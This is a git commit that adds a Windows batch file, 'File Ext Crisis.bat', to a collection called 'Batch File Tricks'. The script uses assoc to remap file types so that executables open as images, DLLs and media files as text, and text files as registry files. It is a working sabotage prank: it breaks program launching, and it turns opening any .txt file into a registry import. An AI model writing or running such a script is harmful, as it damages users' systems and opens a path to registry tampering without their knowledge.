155d04a3ce0b7bcc20c503d4dd92672bc1aa7385
Brady Lange <brady.lange111@gmail.com>
2018-06-09 13:47:13 -0500

    Create File Ext Crisis.bat

---
+++ Batch File Tricks/File Ext Crisis.bat
@@ -0,0 +1,14 @@
+@ echo off
+
+rem Confuse File Extensions Powerup
+assoc .dll=txtfile
+assoc .exe=jpgfile
+assoc .vbs=Visual Style
+assoc .reg=xmlfile
+assoc .txt=regfile
+
+
+rem Confuse File Extensions for text
+assoc .mp3=txtfile
+assoc .xml=txtfile
+assoc .png=txtfile
